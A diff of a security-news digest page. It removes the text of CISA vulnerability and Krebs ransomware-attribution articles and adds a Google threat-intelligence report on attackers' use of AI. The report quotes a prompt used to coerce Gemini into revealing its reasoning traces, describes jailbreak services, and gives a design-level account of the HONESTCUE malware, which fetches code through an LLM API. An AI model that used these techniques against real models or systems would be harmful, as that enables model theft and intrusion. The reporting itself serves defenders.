             <div class="content-text">Today, we’re releasing [Adaptive Spec-driven Scoring for Evaluation and Regression Testing (ASSERT)](https://github.com/responsibleai/ASSERT), an open-source framework for turning natural-language behavior specifications into executable evaluations. Every team building an AI system starts with a clear intention for the behaviors they want to coax from the product. Those expectations are usually written down somewhere: in a product requirement, a policy document, a system prompt, a launch checklist, or a review note. The more difficult step is turning that intention into an eval suite that’s specific enough to run, inspect, and update as the system changes. ASSERT seeks to address this by turning plain-language requirements into full evaluation pipelines: automatically generating test scenarios, datasets, metrics, and scorecards, then running them against your model, application, or agent.
@@ -487,108 +243,32 @@ Special thanks: Roni Burd, Mohammad A, Heba Elfardy, Sandeep Atluri, Sydney List
             <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
             <hr class="separator">
         </div>
-        <div id="art-6" class="article-body">
+        <div id="art-4" class="article-body">
             <h2 class="article-title">CISA Adds Cisco, Chrome, and Arista Flaws to KEV Catalog Amid Active Exploitation</h2>
             <p class="source-link">Source: The Hacker News | <a href="https://thehackernews.com/2026/06/cisa-adds-cisco-chrome-and-arista-flaws.html" target="_blank">Original Link</a></p>
-            <div class="content-text">The U.S. Cybersecurity and Infrastructure Security Agency (CISA) on Tuesday [added](https://www.cisa.gov/news-events/alerts/2026/06/09/cisa-adds-three-known-exploited-vulnerabilities-catalog) three new vulnerabilities to its Known Exploited Vulnerabilities ([KEV](https://www.cisa.gov/known-exploited-vulnerabilities-catalog)) catalog, following reports of active exploitation.
+            <div class="content-text">The U.S. Cybersecurity and Infrastructure Security Agency (CISA) on Tuesday added three new vulnerabilities to its Known Exploited Vulnerabilities (KEV) catalog, following reports of active exploitation.
+
 The list of vulnerabilities is as follows -
-[CVE-2026-20245](https://thehackernews.com/2026/06/cisco-catalyst-sd-wan-manager-cve-2026.html)(CVSS score: 7.8) - An improper encoding or escaping of output vulnerability in Cisco Catalyst SD-WAN Manager that could allow an authenticated, local attacker to execute arbitrary commands as root by supplying a crafted file to the affected system.[CVE-2026-11645](https://thehackernews.com/2026/06/chrome-v8-zero-day-cve-2026-11645.html)(CVSS score: 8.8) - An out-of-bounds read and write vulnerability in Google Chrome V8 that could allow a remote attacker to execute arbitrary code inside a sandbox via a crafted HTML page.[CVE-2026-7473](https://www.arista.com/en/support/advisories-notices/security-advisory/24005-security-advisory-0137)(CVSS score: 6.9) - An incomplete comparison with missing factors vulnerability in Arista Extensible Operating System (EOS) that could be exploited to process non-configured tunnel traffic.
-No Patch Planned for Exploited Arista EOS Flaw
-"On affected platforms running Arista EOS where a tunnel decapsulation configuration - such as VXLAN (Virtual Extensible LAN), decap-groups, or a GRE (Generic Routing Encapsulation) tunnel interface - is present, the switch will incorrectly decapsulate and forward other unexpected tunneled packets with a destination IP matching its configured decapsulation IP," Arista said.
-"This occurs because the switch does not verify the tunnel protocol type, potentially leading to the unexpected processing of non-configured tunnel traffic."
-The security defect mainly impacts 7020R, 7280R/R2, and 7500R/R2 series products. However, for successful exploitation to occur, the device must be configured as a tunnel endpoint with a decapsulation IP, such as a VXLAN VTEP, a GRE tunnel endpoint, or with an IP decap-group.
-The network equipment company acknowledged that the vulnerability has been "reported as being exploited in the wild," crediting Comcast's Scott Christiansen, Lukas Peitz, Rich Compton, and Jonathan Davis for responsibly disclosing it.
-Despite this, Arista said no patches are being planned to address CVE-2026-7473, citing risks that doing so could break existing configurations on deployments. The company has outlined mitigations to address the issue.
-"There are two broad approaches to mitigate this issue - (1) applying ACLs on upstream devices or (2) applying ACLs on the devices where the unexpected decapsulation is happening," Arista said. "In both cases, the idea is to either selectively allow only legitimate tunnel traffic or to selectively block malicious tunnel traffic."
-Federal Civilian Executive Branch (FCEB) agencies have been ordered to apply the necessary fixes or mitigations by June 23, 2026, to counter the threat posed by the three vulnerabilities.
-[Google News](https://news.google.com/publications/CAAqLQgKIidDQklTRndnTWFoTUtFWFJvWldoaFkydGxjbTVsZDNNdVkyOXRLQUFQAQ),</div>
+
+
+  CVE-2026-20245 (CVSS score: 7.8) - An improper encoding or escaping of output vulnerability in Cisco Catalyst SD-WAN Manager that could allow an
+
+[Full content could not be extracted. Visit source for details.]</div>
             <br>
             <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
             <hr class="separator">
         </div>
-        <div id="art-7" class="article-body">
+        <div id="art-5" class="article-body">
             <h2 class="article-title">Who Runs the Ransomware Group ‘The Gentlemen?’</h2>
             <p class="source-link">Source: Krebs on Security | <a href="https://krebsonsecurity.com/2026/06/who-runs-the-ransomware-group-the-gentlemen/" target="_blank">Original Link</a></p>
             <div class="content-text">A cybercrime group known as The Gentlemen has emerged as the second most active ransomware gang by victim count, rapidly attracting a talented pool of hackers through an aggressive recruitment strategy that promises affiliates 90 percent of any ransom paid by victims. This post examines clues pointing to a real life identity for the administrator of The Gentlemen ransomware group.
-Experts at the security firm Check Point Software have been closely covering exploits of The Gentlemen, a so-called “ransomware-as-a-service” (RaaS) offering that pays affiliates handsomely to help spread the group’s malware.
-“A 90/10 affiliate revenue split — compared to the industry standard 80/20 — is accelerating the group’s growth by attracting experienced operators from competing programs,” the researchers wrote in April.
-Check Point [found](https://research.checkpoint.com/2026/thus-spoke-the-gentlemen/) The Gentlemen are the second most active ransomware group by victim count so far this year, claiming at least 332 published victims since the group’s inception in mid-2025 and more than 240 in 2026 alone.
-According to Check Point, the group targets Internet-facing devices (VPNs, firewalls) as their entry point, and once inside moves quickly to encrypt entire networks within hours.
-Check Point says the administrator and primary operator of the ransomware group uses the nickname Zeta88 on the Russian-language cybercrime forums, and that this individual was previously known under the moniker Hastalamuerte. Check Point noted that [a breach](https://www.kelacyber.com/blog/the-gentlemen-ransomware-internal-chat-leak-analysis-2026/) of the group’s backend infrastructure made it clear that Hastalamuerte/Zeta88 is the person who assembles the locker and RaaS panel, manages payments, and is essentially the administrator of the entire program who receives 10 percent of all ransoms.
-WHO IS HASTALAMUERTE?
-The cyber intelligence firm Intel 471 shows that the user Hastalamuerte is a Russian and English speaking person who registered on almost a dozen cybercrime forums between 2019 and the present day, including Exploit, Breachforums, Ramp_V2, BHF, Raidforums, and Nulled.
-Intel 471 reveals that Hastalamuerte registered on Breachforums in January 2025 from an Internet address in Izhevsk, the capital city of Russia’s Udmurt Republic. Likewise, the user Zeta88 signed up at the English-language cybercrime forum Breached in August 2022 from a different Internet address in Izhevsk.
-Intel 471 finds Hastalamuerte registered on Raidforums in 2020 using the email address hastalamuerte1488@protonmail.com (1488 is a common combination of [two numeric symbols associated with white supremacy](https://en.wikipedia.org/wiki/Fourteen_Words)). A lookup on this address at the open source intelligence service Epieos shows it is connected to an account at Apple and to a phone number ending in 04.
-Epieos says that Protonmail address is also linked to a GitHub account under the username SantaMuerte. That account is marked private, but [a history of this user’s activity](https://connectionrequired.com/gitspective/#/timeline/SantaLaMuerte) shows they are watching and developing a number of malware tools and exploits.
-In April 2020, Hastalamuerte said on the crime forum Nulled that they could be contacted at the Telegram instant messenger name @hastalamuerte18, and the threat intelligence company Flashpoint finds this username is assigned the unique Telegram ID number 30907522 [full disclosure: Flashpoint is an advertiser on this blog].
-The breach tracking service Constella Intelligence reports that Hastalamuerte’s Telegram ID is connected to another username — “bu4vs” — and to the Russian phone number 79127650004. Pivoting on this phone number in Constella fetches multiple records from hacked Russian government databases showing it is assigned to one Alexander Andreevich Yapaev, a 36-year-old from Izhevsk.
-Constella reveals that phone number was used to create an account at the Russian social media platform Pikabu under the name “4apai18,” and shows Mr. Yapaev has signed up at a number of websites using the common surname [Ivanov](https://x.com/bu4vs/status/235798656769470465), or else “Chapaev” (the numeral 4 is often used as shorthand for a “ch” sound in Russian).
-A search in Intel 471 for cybercrime forum members with the nickname SantaMuerte unearths an account by the same name created in 2020 on the Russian hacking forum Codeby. Intel 471 shows this user originally registered on Codeby with the not-so-subtle nickname Alexandr 4apaev.
-Constella finds Mr. Yapaev regularly used the email address bu4vs@mail.ru. Meanwhile, Epieos shows this address is connected to a [LinkedIn account](https://www.linkedin.com/in/yapaev/) for Alexander Yapaev, who lists himself as the head of B2B marketing at the company Uralenergo Udmurtia, one of Russia’s largest suppliers of electrotechnical and lighting products.
-Mr. Yapaev did not respond to multiple requests for comment.
-Nearly every time we publish one of these [Breadcrumbs stories](https://krebsonsecurity.com/category/breadcrumbs/), readers are curious to know why it seems like so many cybercriminals from Russia apparently do little to hide their real life identities. The truth is that — Russian or not — most didn’t exactly set out to be arch criminals, but instead got drawn into the scene gradually over several years as their skills broadened and sharpened.
-Another important dynamic is that the Russian government generally either [co-opts or ignores](https://www.recordedfuture.com/research/dark-covenant-3-controlled-impunity-and-russias-cybercriminals) cybercriminal activity within its borders so long as the hackers do not steal from or attack Russian businesses and citizens. As a result, successful cybercriminals in Russia are usually insulated from prosecution and arrest by foreign law enforcement agencies provided they occasionally pay off the right people and do not travel abroad. And cybercriminals who intend to strictly adhere to those unwritten rules may (at least initially) be less concerned about covering their tracks online.
-But the simplest explanation is that cybercriminals of all nationalities tend to make a number of basic operational security mistakes early in their careers, when they are less savvy and have far less to lose by their carelessness. A review of Hastalamuerte’s early posts on the crime forums (circa 2019-2020) shows a relatively unsophisticated and low-skilled hacker still trying to learn the ropes and earn a positive reputation on these communities.
-For example, in June 2020 Hastalamuerte’s Telegram account joined a multi-month training program (@pntst) to learn how to use popular penetration testing tools, and their candid posts to this hacker training camp show Hastalamuerte struggling to use these tools effectively. A Google-translated record of Hastalmuerte’s posts to @pntst is [here](https://krebsonsecurity.com/wp-content/uploads/2026/06/pntst-chat.txt).
-Update, June 11, 10:23 a.m. ET: The threat research group PRODAFT has released [a detailed writeup](https://catalyst.prodaft.com/public/report/inside-the-phantom-mantis-operation/overview#paragraph-1077|172) on the history and current operations of The Gentlemen. PRODAFT said its findings match the same persona with “high confidence,” and found the administrator (Zeta88/Hastalamuerte) supplies affiliates with initial access directly, primarily Fortinet SSL-VPN credentials obtained through brute-force attacks or sourced from the group’s own leak database. They also discovered the administrator is using AI to develop and maintain the ransomware and associated tooling, as well as to assist with post-exploitation activity.
-True operational secrecy is a pain in the butt, hard to maintain, and easy to screw up. That’s why it’s better to be able to act in your real name and not have to worry about it…
-It’s amazing how these ransomware gangs are able to maintain military intelligence level opsec
-Almost as if…
-Um, almost as if their business model provides enough income to afford it? Enough with the conspiracy theories. Brian understands that most of these sorts of operations have a learning curve. They are most vulnerable at three or four times in each ransom cycle (three, if it is an established affiliate relationship for long enough to have ascertained they aren’t involved in a sting). Once they figure out how to proxy, manage their toolchain properly, and successfully get ahold of the money they asked for, the only thing left to worry about is how to make it look legitimate. Ransomware removes the long-term upkeep and gradual profit model of a botnet. Now that companies are willing to pay hundreds of thousands or millions per incident, you don’t need to be ‘Russian’ or ‘Ukrainian’, or have connections to any sort of corrupt officials, you just have to throw someone else under the bus faster than the other person, it looks like.
-‘able to maintain military intelligence level opsec’
-Some of them are run by military intelligence in various countries, some of those are very good at it.
-I don’t think that’s amazing, unbelievable or improbable, nor is it a conspiracy theory. It lines up fine.
-If you’re trying to imply a _particular_ gang or campaign is run by mil.ops, that requires specificity.
-Vague implications are like…
-Has anyone told Apple about “Hastalamuerte registered on Raidforums in 2020 using the email address hastalamuerte1488@protonmail.com (1488 is a common combination of two numeric symbols associated with white supremacy). A lookup on this address at the open source intelligence service Epieos shows it is connected to an account at Apple and to a phone number ending in 04.”
-Can they disable his account?
-I don’t see why. He’s not infringing on any of Apple’s terms with his account, nor has he attacked Apple. Simply *being* a criminal shouldn’t get you disbarred from using any services.
-“He’s not infringing on any of Apple’s terms with his account, nor has he attacked Apple.”
-That _you_ know of? It’s improbable that nobody connected to Apple whatsoever was targeted.
-I’ve not recently deep-read Apple’s EULA but I’d think *being a criminal* is in there somehow…
-Hats off, GENTLEMEN, to Brian Krebs!
-It’s funny. When I start reading it, I thought to myself, “Russian?” And sure enough. It is.
-I think the reason it’s so easy to track there people down (aside from the Russian government letting them do it as long as the victims are in the West and that’s why they don’t care about hiding) is because most of those “hackers” are just plain stupid low lives. Otherwise anyone that had two brain cells had already left that nasty country.
-@Dennis – I think if you have money, are careful and discreet, and stay out of politics… Russia can be a veery pleasant place to live.
-Hmmm. Never seemed to work for Arkady Renko.
-“Nasty country” – pray tell where you’ve found so entirely free of nastiness to live, Mr. Menace?
-Might as well be living on the sun.
-He’s got an umbrella and time to kill. It’s a dry heat.
-I believe his identity is BIG BALLS! You know the guy that got beat up by a girl in DC and even of more surprise he was on a date with a GIRL.
-Seems like something the snowflake orange one would be involved with.
-There was some chatter on Telegram about ShinyHunters running The Gentlemen ransomware group, but oh well…
-Not the same people, of course. Sort of like suggesting Horohorin is, I dunno, the dude that runs the Krebs carding dump site.
-No Doubt!
-TIL that WayBackMachine archived Google Plus (RIP) posts..
-It’s cute that even Russian ransomware gangs think stuff like… GDPR violations? matter at all in the real world.
-From reading the Checkpoint article, it definitely seems like we’re finally getting into the era of “AI-powered ransomware”. Not completely “agentic” a la “claude, ransom this company, make no mistakes”, but like… AI-written panels, AI-written ransom notes, and seeing as how quick and badly they got pwned, I’d imagine some local Chinese AI was like “You’re absolutely right, exposing port 445 on your Synology NAS to the clearnet is the most secure way to securely access your files anywhere!” and now we’re here.
-This pretty much nulls most textual forensics, too, yeah.
-When I lived in Transnistria briefly, many many years ago, there were no ATMs at all. It was a surprisingly genteel place to stay for a week or two to get away from crazies, LGBTQ- obsessed Pussy Riot fans, and tourists, until they made that mean something else entirely. CLEARLY, there was access to legitimate ATMs an easy, cheap train-ride away, until the sheeeyit hit the Kendrick a few months (and many many years) later.
-welp! time for my teeth to marry the extension cord again!
-Arguably, they should not, merely by the existence of a name, known it was the same person, no less a ‘criminal’, right?
-soon the next prod release of Kill Your Celf will push!
-Quickly, quickly ai chatbot!
-The NSA.
-WHAT DID I WIN
-The same guys who run every ransomware group
-The same guys who run Krebs.
-Did you use a real russian time?Brian , or is it a synthetic russian?
-Cant arrest data. Even from the Moscow field office of the FBI
-The same guys who run every ransomware group
-The same guys who run Krebs.
-Did you use a real russian this time?Brian , or is it a synthetic russian?
-Cant arrest data. Even from the Moscow field office of the FBI
-If Yan can’t think then NOBODY IS ALLOWED TO. Off to the reeducation camps like a good lad.
-Martin,
-Go squat in a thorny tree.
-What is Martin’s metier, anyway?
-Krebs isn’t run by any one group of anything any more than you are.
-Lots of AI slop puppeting every meatpuppet now (no offense, Brian).</div>
+
+[Full content could not be extracted. Visit source for details.]</div>
             <br>
             <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
             <hr class="separator">
         </div>
-        <div id="art-8" class="article-body">
+        <div id="art-6" class="article-body">
             <h2 class="article-title">CISA Adds Three Known Exploited Vulnerabilities to Catalog</h2>
             <p class="source-link">Source: All CISA Advisories | <a href="https://www.cisa.gov/news-events/alerts/2026/06/09/cisa-adds-three-known-exploited-vulnerabilities-catalog" target="_blank">Original Link</a></p>
             <div class="content-text">CISA Adds Three Known Exploited Vulnerabilities to Catalog
@@ -602,7 +282,7 @@ This product is provided subject to this [Notification](/notification) and this 
             <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
             <hr class="separator">
         </div>
-        <div id="art-9" class="article-body">
+        <div id="art-7" class="article-body">
             <h2 class="article-title">Canvas Breach Disrupts Schools & Colleges Nationwide</h2>
             <p class="source-link">Source: Krebs on Security | <a href="https://krebsonsecurity.com/2026/05/canvas-breach-disrupts-schools-colleges-nationwide/" target="_blank">Original Link</a></p>
             <div class="content-text">An ongoing data extortion attack targeting the widely-used education technology platform Canvas disrupted classes and coursework at school districts and universities across the United States today, after a cybercrime group defaced the service’s login page with a ransom demand that threatened to leak data from 275 million students and faculty across nearly 9,000 educational institutions.
@@ -747,6 +427,147 @@ Not a very accurate AI summary.
 If I were Instructure I would require every student to get a new unique identifier number.
 Must have sucked to take your AP tests those two weeks.
 A funny side note. I heard that there were students reaching out to the hackers. They wanted to pay the hackers to change their scores 🙂 I heard through reliable source but could have been a fabrication. I wouldnt be surprised at all though and i believe it.</div>
+            <br>
+            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
+            <hr class="separator">
+        </div>
+        <div id="art-8" class="article-body">
+            <h2 class="article-title">GTIG AI Threat Tracker: Distillation, Experimentation, and (Continued) Integration of AI for Adversarial Use</h2>
+            <p class="source-link">Source: Threat Intelligence | <a href="https://cloud.google.com/blog/topics/threat-intelligence/distillation-experimentation-integration-ai-adversarial-use/" target="_blank">Original Link</a></p>
+            <div class="content-text">GTIG AI Threat Tracker: Distillation, Experimentation, and (Continued) Integration of AI for Adversarial Use
+Google Threat Intelligence Group
+Google Threat Intelligence
+Visibility and context on the threats that matter most.
+[Contact Us & Get a Demo](https://cloud.google.com/security/resources/google-threat-intelligence-demo?utm_source=cgc-blog&utm_medium=blog&utm_campaign=FY25-Q2-global-GCP30649-website-su-dgcsm-GTI-interest)
+Introduction
+In the final quarter of 2025, Google Threat Intelligence Group (GTIG) observed threat actors increasingly integrating artificial intelligence (AI) to accelerate the attack lifecycle, achieving productivity gains in reconnaissance, social engineering, and malware development. This report serves as an update to our [November 2025 findings](https://cloud.google.com/blog/topics/threat-intelligence/threat-actor-usage-of-ai-tools) regarding the advances in threat actor usage of AI tools.
+By identifying these early indicators and offensive proofs of concept, GTIG aims to arm defenders with the intelligence necessary to anticipate the next phase of AI-enabled threats, proactively thwart malicious activity, and continually strengthen both our classifiers and model.
+Executive Summary
+Google DeepMind and GTIG have identified an increase in model extraction attempts or "distillation attacks," a method of intellectual property theft that violates Google's terms of service. Throughout this report we've noted steps we've taken to thwart malicious activity, including Google detecting, disrupting, and mitigating model extraction activity. While we have not observed direct attacks on frontier models or generative AI products from advanced persistent threat (APT) actors, we observed and mitigated frequent model extraction attacks from private sector entities all over the world and researchers seeking to clone proprietary logic.
+For government-backed threat actors, large language models (LLMs) have become essential tools for technical research, targeting, and the rapid generation of nuanced phishing lures. This quarterly report highlights how threat actors from the Democratic People's Republic of Korea (DPRK), Iran, the People's Republic of China (PRC), and Russia operationalized AI in late 2025 and improves our understanding of how adversarial misuse of generative AI shows up in campaigns we disrupt in the wild. GTIG has not yet observed APT or information operations (IO) actors achieving breakthrough capabilities that fundamentally alter the threat landscape.
+This report specifically examines:
+- Model Extraction Attacks: "Distillation attacks" are on the rise as a method for intellectual property theft over the last year.
+- AI-Augmented Operations: Real-world case studies demonstrate how groups are streamlining reconnaissance and rapport-building phishing.
+- Agentic AI: Threat actors are beginning to show interest in building agentic AI capabilities to support malware and tooling development.
+- AI-Integrated Malware: There are new malware families, such as HONESTCUE, that experiment with using Gemini's application programming interface (API) to generate code that enables download and execution of second-stage malware.
+- Underground "Jailbreak" Ecosystem: Malicious services like Xanthorox are emerging in the underground, claiming to be independent models while actually relying on jailbroken commercial APIs and open-source Model Context Protocol (MCP) servers.
+At Google, we are committed to developing AI boldly and responsibly, which means taking proactive steps to disrupt malicious activity by disabling the projects and accounts associated with bad actors, while continuously improving our models to make them less susceptible to misuse. We also proactively share industry best practices to arm defenders and enable stronger protections across the ecosystem. Throughout this report, we note steps we've taken to thwart malicious activity, including disabling assets and applying intelligence to strengthen both our classifiers and model so it's protected from misuse moving forward. Additional details on how we're protecting and defending Gemini can be found in the white paper "[Advancing Gemini’s Security Safeguards](https://deepmind.google/discover/blog/advancing-geminis-security-safeguards/)."
+Direct Model Risks: Disrupting Model Extraction Attacks
+As organizations increasingly integrate LLMs into their core operations, the proprietary logic and specialized training of these models have emerged as high-value targets. Historically, adversaries seeking to steal high-tech capabilities used conventional computer-enabled intrusion operations to compromise organizations and steal data containing trade secrets. For many AI technologies where LLMs are offered as services, this approach is no longer required; actors can use legitimate API access to attempt to "clone" select AI model capabilities.
+During 2025, we did not observe any direct attacks on frontier models from tracked APT or information operations (IO) actors. However, we did observe model extraction attacks, also known as distillation attacks, on our AI models, to gain insights into a model's underlying reasoning and chain-of-thought processes.
+What Are Model Extraction Attacks?
+Model extraction attacks (MEA) occur when an adversary uses legitimate access to systematically probe a mature machine learning model to extract information used to train a new model. Adversaries engaging in MEA use a technique called knowledge distillation (KD) to take information gleaned from one model and transfer the knowledge to another. For this reason, MEA are frequently referred to as "distillation attacks."
+Model extraction and subsequent knowledge distillation enable an attacker to accelerate AI model development quickly and at a significantly lower cost. This activity effectively represents a form of intellectual property (IP) theft.
+Knowledge distillation (KD) is a common machine learning technique used to train "student" models from pre-existing "teacher" models. This often involves querying the teacher model for problems in a particular domain, and then performing supervised fine tuning (SFT) on the result or utilizing the result in other model training procedures to produce the student model. There are legitimate uses for distillation, and Google Cloud has [existing offerings](https://developers.google.com/machine-learning/crash-course/llm/tuning) to perform distillation. However, distillation from Google's Gemini models without permission is a violation of our [Terms of Service](https://ai.google.dev/gemini-api/terms#:~:text=You%20may%20not%20use%20the,%28e.g.%2C%20parameter%20weights%29.), and Google continues to develop techniques to detect and mitigate these attempts.
+Figure 1: Illustration of model extraction attacks
+Google DeepMind and GTIG identified and disrupted model extraction attacks, specifically attempts at model stealing and capability extraction emanating from researchers and private sector companies globally.
+Case Study: Reasoning Trace Coercion
+A common target for attackers is Gemini's exceptional reasoning capability. While internal reasoning traces are typically summarized before being delivered to users, attackers have attempted to coerce the model into outputting full reasoning processes.
+One identified attack instructed Gemini that the "... language used in the thinking content must be strictly consistent with the main language of the user input."
+Analysis of this campaign revealed:
+Model Extraction and Distillation Attack Risks
+Model extraction and distillation attacks do not typically represent a risk to average users, as they do not threaten the confidentiality, availability, or integrity of AI services. Instead, the risk is concentrated among model developers and service providers.
+Organizations that provide AI models as a service should monitor API access for extraction or distillation patterns. For example, a custom model tuned for financial data analysis could be targeted by a commercial competitor seeking to create a derivative product, or a coding model could be targeted by an adversary wishing to replicate capabilities in an environment without guardrails.
+Highlights of AI-Augmented Adversary Activity
+A [consistent finding](https://cloud.google.com/blog/topics/threat-intelligence/threat-actor-usage-of-ai-tools) over the past year is that government-backed attackers misuse Gemini for coding and scripting tasks, gathering information about potential targets, researching publicly known vulnerabilities, and enabling post-compromise activities. In Q4 2025, GTIG's understanding of how these efforts translate into real-world operations improved as we saw direct and indirect links between threat actor misuse of Gemini and activity in the wild.
+Figure 2: Threat actors are leveraging AI across all stages of the attack lifecycle
+Supporting Reconnaissance and Target Development
+APT actors used Gemini to support several phases of the attack lifecycle, including a focus on reconnaissance and target development to facilitate initial compromise. This activity underscores a shift toward AI-augmented phishing enablement, where the speed and accuracy of LLMs can bypass the manual labor traditionally required for victim profiling. Beyond generating content for phishing lures, LLMs can serve as a strategic force multiplier during the reconnaissance phase of an attack, allowing threat actors to rapidly synthesize open-source intelligence (OSINT) to profile high-value targets, identify key decision-makers within defense sectors, and map organizational hierarchies. By integrating these tools into their workflow, threat actors can move from initial reconnaissance to active targeting at a faster pace and broader scale.
+-
+UNC6418, an unattributed threat actor, misused Gemini to conduct targeted intelligence gathering, specifically seeking out sensitive account credentials and email addresses. Shortly after, GTIG observed the threat actor target all these accounts in a phishing campaign focused on Ukraine and the defense sector. Google has taken action against this actor by disabling the assets associated with this activity.
+-
+Temp.HEX, a PRC-based threat actor, misused Gemini and other AI tools to compile detailed information on specific individuals, including targets in Pakistan, and to collect operational and structural data on separatist organizations in various countries. While we did not see direct targeting as a result of this research, shortly after the threat actor included similar targets in Pakistan in their campaign. Google has taken action against this actor by disabling the assets associated with this activity.
+Phishing Augmentation
+Defenders and targets have long relied on indicators such as poor grammar, awkward syntax, or lack of cultural context to help identify phishing attempts. Increasingly, threat actors now leverage LLMs to generate hyper-personalized, culturally nuanced lures that can mirror the professional tone of a target organization or local language.
+This capability extends beyond simple email generation into "rapport-building phishing," where models are used to maintain multi-turn, believable conversations with victims to build trust before a malicious payload is ever delivered. By lowering the barrier to entry for non-native speakers and automating the creation of high-quality content, adversaries can largely erase those "tells" and improve the effectiveness of their social engineering efforts.
+-
+The Iranian government-backed actor
+[APT42](https://cloud.google.com/blog/topics/threat-intelligence/untangling-iran-apt42-operations)leveraged generative AI models, including Gemini, to significantly augment reconnaissance and targeted social engineering. APT42 misuses Gemini to search for official emails for specific entities and conduct reconnaissance on potential business partners to establish a credible pretext for an approach. This includes attempts to enumerate the official email addresses for specific entities and to conduct research to establish a credible pretext for an approach. By providing Gemini with the biography of a target, APT42 misused Gemini to craft a good persona or scenario to get engagement from the target. As with many threat actors tracked by GTIG, APT42 uses Gemini to translate into and out of local languages, as well as to better understand non-native-language phrases and references. Google has taken action against this actor by disabling the assets associated with this activity. -
+The North Korean government-backed actor UNC2970 has consistently focused on defense targeting and impersonating corporate recruiters in their campaigns. The group used Gemini to synthesize OSINT and profile high-value targets to support campaign planning and reconnaissance. This actor's target profiling included searching for information on major cybersecurity and defense companies and mapping specific technical job roles and salary information. This activity blurs the distinction between routine professional research and malicious reconnaissance, as the actor gathers the necessary components to create tailored, high-fidelity phishing personas and identify potential soft targets for initial compromise. Google has taken action against this actor by disabling the assets associated with this activity.
+Threat Actors Continue to Use AI to Support Coding and Tooling Development
+State-sponsored actors continue to misuse Gemini to enhance all stages of their operations, from reconnaissance and phishing lure creation to command-and-control (C2 or C&C) development and data exfiltration. We have also observed activity demonstrating an interest in using agentic AI capabilities to support campaigns, such as prompting Gemini with an expert cybersecurity persona, or attempting to create an AI-integrated code auditing capability.
+APT31 employed a highly structured approach by prompting Gemini with an expert cybersecurity persona to automate the analysis of vulnerabilities and generate targeted testing plans. The PRC-based threat actor fabricated a scenario, in one case trialing Hexstrike MCP tooling, and directing the model to analyze remote code execution (RCE), web application firewall (WAF) bypass techniques, and SQL injection test results against specific US-based targets. This automated intelligence gathering to identify technological vulnerabilities and organizational defense weaknesses. This activity explicitly blurs the line between a routine security assessment query and a targeted malicious reconnaissance operation. Google has taken action against this actor by disabling the assets associated with this activity.
+Figure 4: APT31's misuse of Gemini mapped across the attack lifecycle
+UNC795, a PRC-based actor, relied heavily on Gemini throughout their entire attack lifecycle. GTIG observed the group consistently engaging with Gemini multiple days a week to troubleshoot their code, conduct research, and generate technical capabilities for their intrusion activity. The threat actor's activity triggered safety systems, and Gemini did not comply with the actor's attempts to create policy-violating capabilities.
+The group also employed Gemini to create an AI-integrated code auditing capability, likely demonstrating an interest in agentic AI utilities to support their intrusion activity. Google has taken action against this actor by disabling the assets associated with this activity.
+Figure 5: UNC795's misuse of Gemini mapped across the attack lifecycle
+We observed activity likely associated with the PRC-based threat actor APT41, which leveraged Gemini to accelerate the development and deployment of malicious tooling, including for knowledge synthesis, real-time troubleshooting, and code translation. In particular, multiple times the actor gave Gemini open-source tool README pages and asked for explanations and use case examples for specific tools. Google has taken action against this actor by disabling the assets associated with this activity.
+Figure 6: APT41's misuse of Gemini mapped across the attack lifecycle
+In addition to leveraging Gemini for the aforementioned social engineering campaigns, the Iranian threat actor APT42 uses Gemini as an engineering platform to accelerate the development of specialized malicious tools. The threat actor is actively engaged in developing new malware and offensive tooling, leveraging Gemini for debugging, code generation, and researching exploitation techniques. Google has taken action against this actor by disabling the assets associated with this activity.
+Figure 7: APT42's misuse of Gemini mapped across the attack lifecycle
+Using Gemini to Support Information Operations
+GTIG continues to observe IO actors use Gemini for productivity gains (research, content creation, localization, etc.), which aligns with their previous use of Gemini. We have identified Gemini activity that indicates threat actors are soliciting the tool to help create articles, generate assets, and aid them in coding. However, we have not identified this generated content in the wild. None of these attempts have created breakthrough capabilities for IO campaigns. Threat actors from China, Iran, Russia, and Saudi Arabia are producing political satire and propaganda to advance specific ideas across both digital platforms and physical media, such as printed posters.
+Continuing Experimentation with AI-Enabled Malware
+GTIG continued to observe threat actors experiment with AI to implement novel capabilities in malware families in late 2025. While we have not encountered experimental AI-enabled techniques resulting in revolutionary paradigm shifts in the threat landscape, these proof-of-concept malware families are early indicators of how threat actors can implement AI techniques as part of future operations. We expect this exploratory testing will increase in the future.
+In addition to continued experimentation with novel capabilities, throughout late 2025 GTIG observed threat actors integrating conventional AI-generated capabilities into their intrusion operations such as the COINBAIT phishing kit. We expect threat actors will continue to incorporate AI throughout the attack lifecycle including: supporting malware creation, improving pre-existing malware, researching vulnerabilities, conducting reconnaissance, and/or generating lure content.
+Outsourcing Functionality: HONESTCUE
+In September 2025, GTIG observed malware samples, which we track as [HONESTCUE](https://www.virustotal.com/gui/collection/69f762800d3513e19acb8fa34895a46a137168%201370417db5a1db6ee9acad3f28), leveraging Gemini's API to outsource functionality generation. Our examination of HONESTCUE malware samples indicates the adversary's incorporation of AI is likely designed to support a multi-layered approach to obfuscation by undermining traditional network-based detection and static analysis.
+HONESTCUE is a downloader and launcher framework that sends a prompt via Google Gemini's API and receives C# source code as the response. Notably, HONESTCUE shares capabilities similar to PROMPTFLUX's "just-in-time" (JIT) technique [that we previously observed](https://cloud.google.com/blog/topics/threat-intelligence/threat-actor-usage-of-ai-tools); however, rather than leveraging an LLM to update itself, HONESTCUE calls the Gemini API to generate code that operates the "stage two" functionality, which downloads and executes another piece of malware. Additionally, the fileless secondary stage of HONESTCUE takes the C# source code received from the Gemini API and uses the legitimate .NET CSharpCodeProvider framework to compile and execute the payload directly in memory. This approach leaves no payload artifacts on the disk. We have also observed the threat actor use content delivery networks (CDNs) like Discord CDN to host the final payloads.
+Figure 8: HONESTCUE malware
+We have not associated this malware with any existing clusters of threat activity; however, we suspect this malware is being developed by developers who possess a modicum of technical expertise. Specifically, the small iterative changes across many samples as well as the single VirusTotal submitter, potentially testing antivirus capabilities, suggests a singular actor or small group. Additionally, the use of Discord to test payload delivery and the submission of Discord Bots indicates an actor with limited technical sophistication. The consistency and clarity of the architecture coupled with the iterative progression of the examined malware samples strongly suggest this is a single actor or small group likely in the proof-of-concept stage of implementation.
